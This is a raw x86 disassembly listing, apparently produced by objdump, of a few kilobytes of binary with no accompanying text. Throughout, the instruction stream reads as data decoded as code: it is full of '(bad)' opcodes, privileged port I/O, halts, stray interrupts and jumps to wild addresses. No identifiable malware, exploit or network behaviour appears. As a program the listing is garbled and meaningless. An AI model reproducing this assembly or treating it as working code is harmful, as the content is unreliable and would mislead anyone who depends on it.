  41d597:	cmp    esi,DWORD PTR [ebp+0x40cbbc1f]
  41d59d:	push   ecx
  41d59e:	sub    esi,DWORD PTR [eax]
  41d5a0:	cmp    DWORD PTR [ebx-0x33],esp
  41d5a3:	mov    edi,0xd68f0308
  41d5a8:	or     BYTE PTR [ecx],0x82
  41d5ab:	mov    ah,0xf2
  41d5ad:	adc    BYTE PTR ds:0x7cf958a0,ah
  41d5b3:	lahf   
  41d5b4:	es jns 0x41d5e9
  41d5b7:	pop    eax
  41d5b8:	sbb    ah,BYTE PTR [ecx+0x60a99574]
  41d5be:	sar    DWORD PTR [ecx],0xa4
  41d5c1:	xor    eax,0x748ffee7
  41d5c6:	aam    0xd2
  41d5c8:	push   esi
  41d5c9:	das    
  41d5ca:	xchg   eax,ebx
  41d5cc:	sbb    al,0x26
  41d5ce:	xchg   esi,eax
  41d5cf:	xchg   esp,eax
  41d5d0:	in     eax,0x9b
  41d5d2:	or     al,0x5d
  41d5d4:	fild   DWORD PTR [eax-0x31e59bfe]
  41d5da:	scas   al,BYTE PTR es:[edi]
  41d5db:	inc    esi
  41d5dc:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41d5df:	jle    0x41d632
  41d5e1:	(bad)  
  41d5e2:	pop    ds
  41d5e3:	sub    DWORD PTR [ebx],esi
  41d5e5:	in     eax,0x59
  41d5e7:	lods   eax,DWORD PTR ds:[esi]
  41d5e8:	mov    esp,0x8ff730a6
  41d5ed:	add    al,0x9
  41d5ef:	mov    ds:0x21d1ce51,eax
  41d5f4:	in     eax,0x9d
  41d5f6:	stos   BYTE PTR es:[edi],al
  41d5f7:	xor    al,0x8a
  41d5f9:	push   ebp
  41d5fa:	pop    ecx
  41d5fb:	add    ebp,ebp
  41d5fd:	dec    eax
  41d5ff:	adc    edx,DWORD PTR [ebx]
  41d601:	dec    esi
  41d602:	rcr    BYTE PTR [ecx+0x7c989294],1
  41d608:	xchg   ebp,eax
  41d609:	fwait
  41d60a:	sbb    dl,al
  41d60c:	std    
  41d60d:	repnz int 0x2d
  41d610:	and    DWORD PTR [ecx+0x28],ecx
  41d613:	or     BYTE PTR [esi],dh
  41d615:	adc    ecx,DWORD PTR [esi]
  41d617:	cli    
  41d618:	aam    0xb9
  41d61a:	js     0x41d5fd
  41d61c:	and    al,0xaf
  41d61e:	inc    esp
  41d61f:	stos   BYTE PTR es:[edi],al
  41d620:	popa   
  41d621:	xchg   ecx,eax
  41d622:	jns    0x41d5ee
  41d624:	scas   al,BYTE PTR es:[edi]
  41d625:	test   DWORD PTR [esi],esp
  41d627:	cdq    
  41d628:	jge    0x41d60e
  41d62a:	sbb    esi,ecx
  41d62c:	sub    al,0xf5
  41d62e:	pushf  
  41d62f:	aam    0x7
  41d631:	js     0x41d606
  41d633:	dec    ebx
  41d634:	cli    
  41d635:	(bad)  
  41d636:	push   eax
  41d637:	in     al,0x92
  41d639:	aas    
  41d63a:	dec    eax
  41d63b:	mov    dh,0x62
  41d63d:	inc    edx
  41d63e:	rcl    bh,1
  41d640:	scas   al,BYTE PTR es:[edi]
  41d641:	pop    esi
  41d642:	jo     0x41d618
  41d644:	mov    ah,BYTE PTR [esp+edi*8]
  41d647:	rol    BYTE PTR ss:[edi],0x26
  41d64b:	test   eax,0x26e9038
  41d650:	jae    0x41d60e
  41d652:	in     al,0x32
  41d654:	xor    DWORD PTR [edx+0x37de7fa2],ebp
  41d65a:	(bad)  
  41d65b:	cdq    
  41d65c:	pusha  
  41d65d:	and    al,0x59
  41d65f:	(bad)  
  41d660:	imul   ebx,DWORD PTR [ebp+0x73],0x374ffdbd
  41d667:	xchg   esi,eax
  41d668:	scas   al,BYTE PTR es:[edi]
  41d669:	adc    DWORD PTR [ecx-0xabedbbf],edx
  41d66f:	xchg   esp,eax
  41d670:	xor    eax,0x57d6eb99
  41d675:	or     edx,ecx
  41d677:	retf   
  41d678:	lahf   
  41d679:	shl    BYTE PTR [esi-0x50],1
  41d67c:	xor    DWORD PTR [edi],ecx
  41d67e:	push   0xa
  41d680:	addr16 jne 0x41d609
  41d683:	mov    eax,edi
  41d685:	mov    edi,0x8fed29ce
  41d68a:	aas    
  41d68b:	cli    
  41d68c:	jp     0x41d6b7
  41d68e:	int    0xf1
  41d690:	adc    eax,0x3ec5f9c2
  41d695:	pop    ecx
  41d696:	inc    esp
  41d697:	mov    esp,0x76d7e3ca
  41d69c:	adc    BYTE PTR [esi+0x7c],dl
  41d69f:	icebp  
  41d6a0:	add    BYTE PTR [ebp+0x2a],ch
  41d6a3:	sub    ebp,0xd7c9d9f5
  41d6a9:	dec    eax
  41d6aa:	sub    eax,DWORD PTR [eax-0x342fa62c]
  41d6b0:	cli    
  41d6b1:	mov    edi,0x30c71db7
  41d6b6:	and    al,0x98
  41d6b8:	outs   dx,BYTE PTR ds:[esi]
  41d6b9:	cdq    
  41d6ba:	jno    0x41d6a7
  41d6bc:	mov    esp,0x1d190f4c
  41d6c1:	test   eax,0xb548025a
  41d6c6:	sbb    DWORD PTR [edx-0x6cb5c219],ebp
  41d6cc:	(bad)  
  41d6cd:	adc    dl,dh
  41d6cf:	fisub  DWORD PTR [ebp-0x22]
  41d6d2:	dec    edx
  41d6d3:	fsubr  st(1),st
  41d6d5:	sahf   
  41d6d6:	jo     0x41d6dc
  41d6d8:	shl    DWORD PTR [ebx],cl
  41d6da:	jge    0x41d6a6
  41d6dc:	retf   
  41d6dd:	iret   
  41d6de:	ret    
  41d6df:	jl     0x41d6ec
  41d6e1:	sub    bh,dl
  41d6e3:	mov    ecx,0x157ab693
  41d6e8:	mov    ecx,0x5a
	...
  41d6f5:	add    BYTE PTR [eax],al
  41d6f7:	pop    ss
  41d6f8:	(bad)  
  41d6f9:	jecxz  0x41d6d9
  41d6fb:	repz (bad) 
  41d6fd:	aas    
  41d6fe:	iret   
  41d6ff:	pop    ds
  41d700:	xchg   ecx,eax
  41d701:	inc    edi
  41d702:	dec    esp
  41d703:	inc    eax
  41d704:	cld    
  41d705:	sub    ah,BYTE PTR [edx+eiz*8]
  41d708:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d709:	add    DWORD PTR [eax],eax
  41d70b:	sub    eax,DWORD PTR [edx]
  41d70d:	add    BYTE PTR [eax],al
  41d70f:	ret    0xe9f
  41d712:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d713:	scas   al,BYTE PTR es:[edi]
  41d714:	stc    
  41d715:	push   es
  41d716:	arpl   WORD PTR [esi],si
  41d718:	mov    ebp,0x45d92de9
  41d71d:	ss mov ah,0xe8
  41d720:	cmp    ebx,edx
  41d722:	cdq    
  41d723:	repnz shl DWORD PTR [eax+0x46],cl
  41d727:	mov    ebp,0xb2e6f666
  41d72c:	add    eax,0xd93102f
  41d731:	jnp    0x41d6fd
  41d733:	jb     0x41d792
  41d735:	xchg   ebx,eax
  41d736:	adc    WORD PTR [eax+0x24],di
  41d73a:	les    ecx,FWORD PTR [ebx+0x614be0a8]
  41d740:	loopne 0x41d799
  41d742:	(bad)  
  41d743:	pop    ebx
  41d744:	cmp    al,0x99
  41d746:	xchg   esi,eax
  41d747:	dec    BYTE PTR [edi]
  41d749:	and    al,0xf
  41d74b:	outs   dx,BYTE PTR ds:[esi]
  41d74c:	sbb    al,0x40
  41d74e:	add    ecx,DWORD PTR [edx-0x61285a42]
  41d754:	es jno 0x41d784
  41d757:	ret    
  41d758:	and    eax,0xb7a5f809
  41d75d:	adc    ebx,eax
  41d75f:	sbb    al,0x53
  41d761:	rcl    ecx,0xba
  41d764:	ror    BYTE PTR [ecx-0x2bd88402],0xb4
  41d76b:	call   0x8099db01
  41d770:	mov    ah,0x1f
  41d772:	add    al,0xb0
  41d774:	push   edx
  41d775:	shl    BYTE PTR [edx+0x210a2665],0x33
  41d77c:	xchg   DWORD PTR [ecx],ecx
  41d77e:	int3   
  41d77f:	stos   BYTE PTR es:[edi],al
  41d780:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d781:	push   0xffffffa6
  41d783:	xor    BYTE PTR [esp+esi*2+0x5c],bl
  41d787:	popf   
  41d788:	pop    ds
  41d789:	pop    esi
  41d78a:	das    
  41d78b:	in     eax,dx
  41d78c:	sbb    al,0x8b
  41d78e:	std    
  41d78f:	stc    
  41d790:	and    ebp,DWORD PTR [esi-0x6]
  41d793:	mov    eax,ds:0xaed67a6b
  41d798:	xor    dh,BYTE PTR [esi+edi*1-0x86ead9b]
  41d79f:	in     al,0xbf
  41d7a1:	mov    DWORD PTR [edi+0xb],esi
  41d7a4:	mov    ch,0xc2
  41d7a6:	inc    edi
  41d7a7:	daa    
  41d7a8:	sub    BYTE PTR [eax-0x77370e7e],dh
  41d7ae:	jb     0x41d82b
  41d7b0:	pop    ds
  41d7b1:	mov    cl,0xdd
  41d7b3:	scas   al,BYTE PTR es:[edi]
  41d7b4:	fimul  WORD PTR [eax+eiz*8]
  41d7b7:	cmp    eax,0x703a97e8
  41d7bc:	in     al,0x65
  41d7be:	fistp  WORD PTR [edx+0x66]
  41d7c1:	jbe    0x41d7c2
  41d7c3:	xor    bh,BYTE PTR [ebx]
  41d7c5:	mov    eax,ds:0x1de73a1e
  41d7ca:	and    ebp,eax
  41d7cc:	xchg   ecx,eax
  41d7cd:	lahf   
  41d7ce:	test   BYTE PTR [ebx+0x4f],ch
  41d7d1:	stos   DWORD PTR es:[edi],eax
  41d7d2:	stos   DWORD PTR es:[edi],eax
  41d7d3:	(bad)  
  41d7d4:	out    0x97,al
  41d7d6:	jg     0x41d7ae
  41d7d8:	mov    bl,0x5c
  41d7da:	mov    ebx,0x1b6b552c
  41d7df:	ret    
  41d7e0:	jnp    0x41d810
  41d7e2:	out    dx,al
  41d7e3:	push   0xffffffa4
  41d7e5:	xchg   bl,ah
  41d7e7:	and    BYTE PTR [edi-0x4],bl
  41d7ea:	sub    DWORD PTR [edx+0x71],0x603085d4
  41d7f1:	dec    ecx
  41d7f2:	mov    al,ds:0xdbe56714
  41d7f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7f8:	es retf 0xd345
  41d7fc:	push   ecx
  41d7fd:	cmp    al,ah
  41d7ff:	loope  0x41d7b0
  41d801:	pop    ds
  41d802:	loope  0x41d86d
  41d804:	pop    ecx
  41d805:	hlt    
  41d806:	or     DWORD PTR [edx+ebx*4],0x8520b587
  41d80d:	sub    ebp,0xffffff9f
  41d810:	(bad)
  41d813:	mov    BYTE PTR [edi-0x1b67f0cc],dh
  41d819:	outs   dx,DWORD PTR ds:[esi]
  41d81a:	adc    al,0x5b
  41d81c:	jl     0x41d7ae
  41d81e:	or     ah,bh
  41d820:	outs   dx,BYTE PTR ds:[esi]
  41d821:	fstp   QWORD PTR [ecx+0x38]
  41d824:	pop    edx
  41d825:	pop    ss
  41d826:	retf   0x18bc
  41d829:	xchg   DWORD PTR [edx-0x73],ebx
  41d82c:	imul   ebp,DWORD PTR [esi-0x64],0x9720279e
  41d833:	(bad)  
  41d834:	or     eax,0x8176e7c5
  41d839:	push   eax
  41d83a:	xchg   eax,ecx
  41d83c:	pop    esi
  41d83d:	loopne 0x41d836
  41d83f:	mov    edx,0xbc1f8806
  41d844:	hlt    
  41d845:	mov    ebp,0xef9e29d6
  41d84a:	push   es
  41d84b:	daa    
  41d84c:	mov    cs,WORD PTR [esi+0xd5798c8]
  41d852:	inc    ecx
  41d853:	js     0x41d86f
  41d855:	or     DWORD PTR [ebx],ebp
  41d857:	jl     0x41d820
  41d859:	mov    ds:0xa87f4022,eax
  41d85e:	and    al,ah
  41d860:	adc    eax,0x40688268
  41d865:	ret    0xda12
  41d868:	cmp    BYTE PTR [edx-0x2ab6d2c6],ch
  41d86e:	shl    al,0xe6
  41d871:	or     ah,BYTE PTR [edx]
  41d873:	out    dx,eax
  41d874:	mov    al,ds:0xc8a4ad3
  41d879:	ss fs sub dh,bh
  41d87d:	sub    DWORD PTR [eax-0x4d442e88],eax
  41d883:	mov    eax,0xe79e3a56
  41d888:	clc    
  41d889:	mov    ch,0x73
  41d88b:	icebp  
  41d88c:	int    0x6d
  41d88e:	je     0x41d8a4
  41d890:	repz cs jp 0x41d904
  41d894:	or     al,0xa7
  41d896:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d897:	into   
  41d898:	les    ebx,FWORD PTR [edi-0x16c83071]
  41d89e:	sub    al,BYTE PTR [ecx-0xc]
  41d8a1:	les    ebx,FWORD PTR [ecx+0x47f54eb9]
  41d8a7:	shr    DWORD PTR ds:0xbbfd8796,1
  41d8ad:	aaa    
  41d8ae:	mov    DWORD PTR [ebx],esi
  41d8b0:	ins    DWORD PTR es:[edi],dx
  41d8b1:	mov    esp,0xa6b93b5a
  41d8b6:	loope  0x41d8f5
  41d8b8:	dec    ebp
  41d8b9:	outs   dx,DWORD PTR ds:[esi]
  41d8ba:	pop    eax
  41d8bb:	mov    cl,0x85
  41d8bd:	sub    BYTE PTR [esp+esi*8-0x6b06c104],ah
  41d8c4:	addr16 push 0x19
  41d8c7:	(bad)  
  41d8c8:	ret    
  41d8c9:	not    eax
  41d8cb:	ja     0x41d93e
  41d8cd:	fprem  
  41d8cf:	xor    al,0xf7
  41d8d1:	xor    BYTE PTR [ebp-0x1d],dl
  41d8d4:	cmp    bl,0x9a
  41d8d7:	mov    bh,0xe6
  41d8d9:	fcmovb st,st(7)
  41d8db:	stos   BYTE PTR es:[edi],al
  41d8dc:	loop   0x41d90c
  41d8de:	inc    edi
  41d8df:	xor    BYTE PTR [ebp-0x4],ah
  41d8e2:	dec    eax
  41d8e3:	ds or  eax,0xbbcf6f4c
  41d8e9:	jno    0x41d897
  41d8eb:	fmul   DWORD PTR [edx]
  41d8ed:	xor    al,BYTE PTR [edi-0x3434bf89]
  41d8f3:	mov    BYTE PTR [ecx],cl
  41d8f5:	dec    eax
  41d8f6:	mov    edi,0xf8e00920
  41d8fb:	push   ebp
  41d8fc:	mov    WORD PTR [edi-0x327527dd],ss
  41d902:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41d904:	in     eax,dx
  41d905:	stos   DWORD PTR es:[edi],eax
  41d906:	push   esp
  41d907:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d908:	icebp  
  41d909:	jge    0x41d939
  41d90b:	and    DWORD PTR [ebx+0x6d],edx
  41d90e:	cmp    cl,bh
  41d910:	jmp    0x94608b75
  41d915:	add    eax,0xd5a06766
  41d91a:	jno    0x41d916
  41d91c:	push   edi
  41d91d:	mov    ds:0x609eae8b,eax
  41d922:	push   ecx
  41d923:	mov    ss:0xdd655700,eax
  41d929:	sub    DWORD PTR [edx],0x5f78a01d
  41d92f:	mov    ebx,0x68b3a9b1
  41d934:	sbb    BYTE PTR [ecx+0x78],dh
  41d937:	(bad)  
  41d938:	pop    esp
  41d939:	xlat   BYTE PTR ds:[ebx]
	...
  41d946:	add    BYTE PTR [edi+0x13],dl
  41d949:	cmp    DWORD PTR [ebx+0x7d],edx
  41d94c:	jnp    0x41d9cd
  41d94e:	pop    ss
  41d94f:	mov    WORD PTR [ebp+0x479ee986],fs
  41d955:	imul   ebp,DWORD PTR [ebx],0x1a70d
  41d95b:	sub    eax,DWORD PTR [edx]
  41d95d:	add    BYTE PTR [eax],al
  41d95f:	cmp    al,0x33
  41d961:	sbb    ecx,DWORD PTR [edx+ebp*8-0x73a988d2]
  41d968:	sub    esp,DWORD PTR [ebx+0x43]
  41d96b:	call   0x4bc505f1
  41d970:	xchg   esi,eax
  41d971:	cmp    BYTE PTR [ebp-0x75b42c24],cl
  41d977:	pop    ds
  41d978:	sbb    BYTE PTR [ebp+edi*1-0x5f],bh
  41d97c:	ins    DWORD PTR es:[edi],dx
  41d97d:	add    esp,edi
  41d97f:	mov    ebp,0x229a7be9
  41d984:	call   0xac031729
  41d989:	sbb    ch,ch
  41d98b:	scas   eax,DWORD PTR es:[edi]
  41d98c:	(bad)  
  41d98d:	pop    ecx
  41d98e:	jnp    0x41d952
  41d990:	out    dx,eax
  41d991:	dec    ecx
  41d992:	stos   DWORD PTR es:[edi],eax
  41d993:	cmp    edi,DWORD PTR ss:[esi+0x64]
  41d997:	mul    BYTE PTR [edx-0x148ff958]
  41d99d:	call   0x7bb8:0xe33536fb
  41d9a4:	fmul   st(1),st
  41d9a6:	dec    ebp
  41d9a7:	stc    
  41d9a8:	jg     0x41d956
  41d9aa:	adc    ecx,DWORD PTR [edx+0x6f]
  41d9ad:	rcr    BYTE PTR [edi+0x57],0x67
  41d9b1:	push   es
  41d9b2:	xchg   ecx,eax
  41d9b3:	pop    ds
  41d9b4:	aaa    
  41d9b5:	test   al,0xbc
  41d9b7:	rol    DWORD PTR [ebx],1
  41d9b9:	out    dx,al
  41d9ba:	xor    ecx,DWORD PTR [eax-0x23]
  41d9bd:	jp     0x41d993
  41d9bf:	shl    DWORD PTR [edx+0x76],1
  41d9c2:	push   esp
  41d9c3:	and    eax,0x5e7804bb
  41d9c8:	rol    DWORD PTR [ebp+0x12],1
  41d9cb:	fiadd  DWORD PTR [eax+0x2aaf3567]
  41d9d1:	mov    ebp,0x80822b5f
  41d9d6:	push   0xffffffee
  41d9d8:	fcom   QWORD PTR [esi]
  41d9da:	mov    ah,0x86
  41d9dc:	imul   esp,esi,0xc7e16b9b
  41d9e2:	push   es
  41d9e3:	retf   0x9516
  41d9e6:	retf   0x5426
  41d9e9:	jbe    0x41da0b
  41d9eb:	mov    BYTE PTR [ebp+0x3116639f],dh
  41d9f1:	jbe    0x41d9e7
  41d9f3:	idiv   DWORD PTR [ebp+0x757fd034]
  41d9f9:	add    ch,BYTE PTR [edi]
  41d9fb:	loopne 0x41da6a
  41d9fd:	push   ecx
  41d9fe:	xor    DWORD PTR [esi-0x13],ecx
  41da01:	cli    
  41da02:	addr16 sbb eax,0x6c019634
  41da08:	pop    ss
  41da09:	jge    0x41da58
  41da0b:	and    ecx,DWORD PTR [edi+0x22d53642]
  41da11:	xchg   BYTE PTR [edx+0x1dada1af],dl
  41da17:	or     al,0xad
  41da19:	add    BYTE PTR [ebx+0x54],cl
  41da1c:	je     0x41d9b0
  41da1e:	mov    ds:0xa95841b7,eax
  41da23:	pop    esi
  41da24:	sahf   
  41da25:	sub    BYTE PTR [eax-0x538a6923],dl
  41da2b:	lods   al,BYTE PTR ds:[esi]
  41da2c:	lahf   
  41da2d:	push   ds
  41da2e:	data16 lahf 
  41da30:	pop    ebx
  41da31:	test   bl,dh
  41da33:	dec    ebp
  41da34:	jecxz  0x41da37
  41da36:	cmp    BYTE PTR [edx-0x2d],bh
  41da39:	or     eax,0x11642f37
  41da3e:	mov    al,0xb2
  41da40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da41:	or     al,0x8f
  41da43:	xchg   edi,eax
  41da44:	xor    DWORD PTR [ebp+0x3f],esi
  41da47:	sbb    al,BYTE PTR [ebx+ebx*2+0x1535b3c3]
  41da4e:	rol    DWORD PTR [ebx-0x80],1
  41da51:	aam    0x61
  41da53:	jo     0x41da7a
  41da55:	outs   dx,BYTE PTR ds:[esi]
  41da56:	lea    ebp,[ecx-0x5b3e724a]
  41da5c:	mov    ebx,0x1f897bdd
  41da61:	mov    esi,0xfd9be380
  41da66:	adc    al,0xb7
  41da68:	adc    esi,DWORD PTR [edx+eax*2-0x1616d186]
  41da6f:	push   ss
  41da70:	ret    0xa664
  41da73:	(bad)  
  41da75:	sbb    al,0x8c
  41da77:	xchg   BYTE PTR [edx],ch
  41da79:	enter  0xf4d6,0x12
  41da7d:	and    bl,BYTE PTR [ecx+esi*1-0x57]
  41da81:	dec    ecx
  41da82:	mov    ebp,DWORD PTR [ecx+0x6a]
  41da85:	push   ebp
  41da86:	ret    
  41da87:	test   al,0x89
  41da89:	shl    dh,0x87
  41da8c:	das    
  41da8d:	sar    BYTE PTR [ecx],0xe3
  41da90:	fisttp DWORD PTR [edx-0x34]
  41da93:	pusha  
  41da94:	push   edx
  41da95:	jb     0x41da98
  41da97:	pop    edx
  41da98:	ret    
  41da99:	xor    BYTE PTR [ebx-0x383f841e],bh
  41da9f:	jbe    0x41da7b
  41daa1:	pop    ebp
  41daa2:	push   esi
  41daa3:	push   0xffffffbc
  41daa5:	mov    ds:0x4fa48667,eax
  41daaa:	(bad)  
  41daab:	out    0x34,eax
  41daad:	mov    DWORD PTR [ebp+0x3252c26e],ecx
  41dab3:	popa   
  41dab4:	mov    bh,0xe1
  41dab6:	xchg   ebp,eax
  41dab7:	(bad)  
  41dab8:	gs mov esp,0xfa534bd0
  41dabe:	icebp  
  41dabf:	pushf  
  41dac0:	bound  eax,QWORD PTR [edx+ebp*8+0x61]
  41dac4:	jo     0x41da4e
  41dac6:	mov    ds:0xdba1b5d0,al
  41dacb:	fdiv   st,st(1)
  41dacd:	shr    ecx,cl
  41dacf:	adc    ebx,ebp
  41dad1:	js     0x41da72
  41dad3:	xor    DWORD PTR [ecx],ebx
  41dad5:	lds    eax,FWORD PTR [edx-0x7e08d94c]
  41dadb:	push   esp
  41dadc:	(bad)  
  41dade:	adc    edi,edx
  41dae0:	cli    
  41dae1:	xchg   esp,eax
  41dae2:	daa    
  41dae3:	mov    edi,0xd4282024
  41dae8:	push   esi
  41dae9:	lods   al,BYTE PTR ds:[esi]
  41daea:	jbe    0x41da6c
  41daec:	jg     0x41da92
  41daee:	xchg   BYTE PTR [eax],bl
  41daf0:	xor    al,0x11
  41daf2:	push   0x95dd2fe9
  41daf7:	fld    QWORD PTR [esp+eax*1+0xc0c2e35]
  41dafe:	(bad)  
  41db00:	jge    0x41dad0
  41db02:	or     al,0x25
  41db04:	lea    eax,[esi]
  41db06:	mov    ebp,0x1e15d11b
  41db0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db0c:	xchg   ecx,eax
  41db0d:	xor    eax,0x5918c6c7
  41db12:	xchg   ecx,eax
  41db13:	push   ebx
  41db14:	inc    edx
  41db15:	(bad)  
  41db16:	xor    esi,DWORD PTR [eax+0x61badb01]
  41db1c:	jo     0x41db00
  41db1e:	jo     0x41db51
  41db20:	sub    al,0x36
  41db22:	mov    ecx,0xac934eec
  41db27:	aad    0xbe
  41db29:	dec    edi
  41db2a:	xchg   DWORD PTR [edi-0x726ac473],edi
  41db30:	ret    
  41db31:	call   0x1e71fcad
  41db36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db37:	xchg   ecx,eax
  41db38:	mov    ah,0xfd
  41db3a:	inc    ecx
  41db3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db3c:	es (bad) 
  41db3e:	fst    QWORD PTR [eax]
  41db40:	fstp   TBYTE PTR [edi-0x799767ee]
  41db46:	bound  esi,QWORD PTR [esi-0x7c16bf1b]
  41db4c:	xlat   BYTE PTR ds:[ebx]
  41db4d:	out    dx,al
  41db4e:	inc    esp
  41db4f:	add    ebx,eax
  41db51:	cmp    ch,BYTE PTR [eax]
  41db53:	sub    eax,DWORD PTR [ebx]
  41db55:	dec    ebp
  41db56:	bound  edx,QWORD PTR [ebp+0x6b3f6ea6]
  41db5c:	jno    0x41db6f
  41db5e:	iret   
  41db5f:	push   ebx
  41db60:	mov    bh,0x1d
  41db62:	fidivr DWORD PTR [eax-0x6149fbf1]
  41db68:	cdq    
  41db69:	and    DWORD PTR [ebx],0xb99d304b
  41db6f:	pop    ebp
  41db70:	stos   DWORD PTR es:[edi],eax
  41db71:	lock rcr BYTE PTR [eax-0x70e29e95],0x40
  41db79:	cli    
  41db7a:	xor    ebp,DWORD PTR [eax+0x23]
  41db7d:	pop    ecx
  41db7e:	(bad)  
  41db80:	(bad)  
  41db81:	fcom   DWORD PTR [edi-0x62]
  41db84:	push   ebx
  41db85:	xchg   esp,eax
  41db86:	or     BYTE PTR [edx],dl
  41db88:	sbb    esp,DWORD PTR [esi+0x0]
	...
  41db97:	add    al,0x54
  41db99:	(bad)  
  41db9a:	jnp    0x41db72
  41db9c:	sti    
  41db9d:	mov    ebp,0x569ff07f
  41dba2:	mov    cl,0x98
  41dba4:	inc    esi
  41dba5:	adc    esp,edx
  41dba7:	cmp    BYTE PTR [ecx+0x22b0001],ch
  41dbad:	add    BYTE PTR [eax],al
  41dbaf:	shl    DWORD PTR [edi-0x372aa95d],cl
  41dbb5:	aas    
  41dbb6:	add    al,0x7b
  41dbb8:	shl    BYTE PTR [ebp-0x2ddde30e],0x8d
  41dbbf:	xchg   ebx,eax
  41dbc0:	pop    es
  41dbc1:	jno    0x41dc16
  41dbc3:	and    DWORD PTR [edx+0xbcfe53b],edx
  41dbc9:	mov    ebx,0xd3a96f80
  41dbce:	sub    ebx,DWORD PTR [ecx-0x22]
  41dbd1:	test   DWORD PTR [edi-0x43],esi
  41dbd4:	test   BYTE PTR [esi-0x35],dl
  41dbd7:	lods   eax,DWORD PTR ds:[esi]
  41dbd8:	sbb    al,0x8a
  41dbda:	jmp    0x4cf2:0x4a2960a4
  41dbe1:	jmp    0x5ca653b5
  41dbe6:	ins    DWORD PTR es:[edi],dx
  41dbe7:	sahf   
  41dbe8:	mov    eax,0xbb7291aa
  41dbed:	xchg   ecx,eax
  41dbee:	lahf   
  41dbef:	add    al,0x5f
  41dbf1:	sbb    DWORD PTR [esi],ecx
  41dbf3:	ins    DWORD PTR es:[edi],dx
  41dbf4:	push   ds
  41dbf5:	add    al,BYTE PTR [edx]
  41dbf7:	aam    0x23
  41dbf9:	inc    ebp
  41dbfb:	cmp    BYTE PTR [ebp+0x2775c042],dl
  41dc01:	test   DWORD PTR [edx],esi
  41dc03:	fild   QWORD PTR [ecx-0x3c]
  41dc06:	and    ebx,ebx
  41dc08:	test   DWORD PTR [ebp+0x43],ecx
  41dc0b:	push   ss
  41dc0c:	xlat   BYTE PTR ds:[ebx]
  41dc0d:	scas   al,BYTE PTR es:[edi]
  41dc0e:	jne    0x41dbec
  41dc10:	push   ebp
  41dc11:	(bad)  
  41dc12:	mov    ds:0xada4fb94,eax
  41dc17:	and    esi,DWORD PTR [edx-0x61]
  41dc1a:	mov    al,ah
  41dc1c:	rcl    BYTE PTR [esi+0x93f22ae],cl
  41dc22:	sub    ebp,DWORD PTR [edi]
  41dc24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc25:	or     eax,0x77d27c03
  41dc2a:	int    0x5
  41dc2c:	shl    DWORD PTR [ecx+edi*2],cl
  41dc2f:	enter  0x1f9c,0xd6
  41dc33:	scas   al,BYTE PTR es:[edi]
  41dc34:	pusha  
  41dc35:	int    0x92
  41dc37:	sub    BYTE PTR [edi+0x46],cl
  41dc3a:	xchg   ecx,eax
  41dc3b:	std    
  41dc3c:	stos   BYTE PTR es:[edi],al
  41dc3d:	std    
  41dc3e:	mov    dh,0xab
  41dc40:	push   ebp
  41dc41:	rol    BYTE PTR [ecx+0x3d5e359e],0x58
  41dc48:	mov    ebx,0xd9ee41da
  41dc4d:	or     eax,0xf1b91eba
  41dc52:	mov    al,ds:0x49b28431
  41dc57:	cli    
  41dc58:	test   ecx,ebx
  41dc5a:	int    0x22
  41dc5c:	or     edx,edi
  41dc5e:	lds    esp,FWORD PTR [edx+edx*1-0x7a]
  41dc62:	jnp    0x41dcc5
  41dc64:	jns    0x41dcd4
  41dc66:	loopne 0x41dc39
  41dc68:	mov    ah,ch
  41dc6a:	call   0xa81cc225
  41dc6f:	and    al,0xf8
  41dc71:	xchg   esi,eax
  41dc72:	in     al,0x57
  41dc74:	dec    ebp
  41dc75:	int    0x48
  41dc77:	dec    ecx
  41dc78:	int    0x68
  41dc7a:	mov    ebx,0x266ae176
  41dc7f:	adc    BYTE PTR [esi-0x678f0946],cl
  41dc85:	fnstcw WORD PTR [edx+esi*8]
  41dc88:	push   ds
  41dc89:	mov    dh,0x9c
  41dc8b:	or     eax,0x26c6f11
  41dc90:	xlat   BYTE PTR ds:[ebx]
  41dc91:	jmp    0x9244e75d
  41dc96:	test   al,0x5a
  41dc98:	mov    edi,0x84daaf55
  41dc9d:	stos   DWORD PTR es:[edi],eax
  41dc9e:	jnp    0x41dc43
  41dca0:	aas    
  41dca1:	dec    eax
  41dca2:	icebp  
  41dca3:	dec    ebx
  41dca4:	mov    ds:0x9bd3f5d5,eax
  41dca9:	pusha  
  41dcaa:	add    al,0x5c
  41dcac:	cmp    edi,DWORD PTR es:[ebx]
  41dcaf:	push   cs
  41dcb0:	lock out 0x60,al
  41dcb3:	jg     0x41dcc3
  41dcb5:	fnstenv [esi+0x59]
  41dcb8:	push   0xe20086d
  41dcbd:	mov    esp,0x262b8725
  41dcc2:	sbb    edi,esi
  41dcc4:	ss out dx,eax
  41dcc6:	ss push ebp
  41dcc8:	test   eax,0xcaa8f43c
  41dccd:	jmp    0x16050a31
  41dcd2:	dec    ecx
  41dcd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcd4:	scas   eax,DWORD PTR es:[edi]
  41dcd5:	or     al,0x26
  41dcd7:	xchg   ebp,eax
  41dcd8:	shl    eax,0x8f
  41dcdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcdd:	mov    al,0x27
  41dcdf:	jge    0x41dd36
  41dce1:	jne    0x41dcec
  41dce3:	imul   eax,DWORD PTR [ecx],0xffffffe0
  41dce6:	das    
  41dce7:	into   
  41dce8:	sub    DWORD PTR [ecx-0x64c9de42],ebx
  41dcee:	ret    0x4d7
  41dcf1:	mov    eax,0x45d22f51
  41dcf6:	pslld  mm4,QWORD PTR [ecx]
  41dcf9:	je     0x41dcb3
  41dcfb:	mov    ch,0x4c
  41dcfd:	push   ecx
  41dcfe:	jae    0x41dcf1
